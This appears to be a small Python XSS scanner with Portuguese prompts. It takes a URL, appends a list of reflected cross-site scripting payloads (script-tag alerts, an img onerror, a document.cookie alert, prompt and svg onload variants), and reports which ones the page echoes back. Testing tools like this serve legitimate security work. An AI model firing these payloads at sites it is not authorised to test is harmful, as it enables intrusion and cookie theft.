import time
import warnings
warnings.filterwarnings('ignore')
import requests
from utils import save_results


def test_xss():
    url = input("Enter URL: ")

    xss_payload = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<script>alert(document.cookie)</script>",
        "-prompt(8)-",
        "-prompt(8)-",
        ";a=prompt,a()//",
        ";a=prompt,a()//",
        "onclick=prompt(8)>@x.y",
        "onclick=prompt(8)><svg/onload=prompt(8)>@x.y"
    ]

    results = []
    start_time = time.time()
    
    for payload in xss_payload:
        try:
            response = requests.get(url + payload, timeout=5)
            if payload in response.text:
                results.append({'Payload': payload, 'Vulnerable': True})
                print(f"XSS Vulnerable {payload}")
            else:
                results.append({'Payload': payload, 'Vulnerable': False})
                print(f"Not Vulnerable {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao executar o payload {payload}: {e}")
    
    end_time = time.time()
    print(f"Tempo de execução: {(end_time - start_time):.2f} segundos")
    
    save = input("Deseja salvar o resultado? (s/n): ")
    if save.lower() == 's':
        organize_output = url.replace('http://', '').replace('https://', '').replace('/', '_')
        save_results(results, 'xss_results', f'xss_{organize_output}.json')
        print('Resultado salvo com sucesso!')
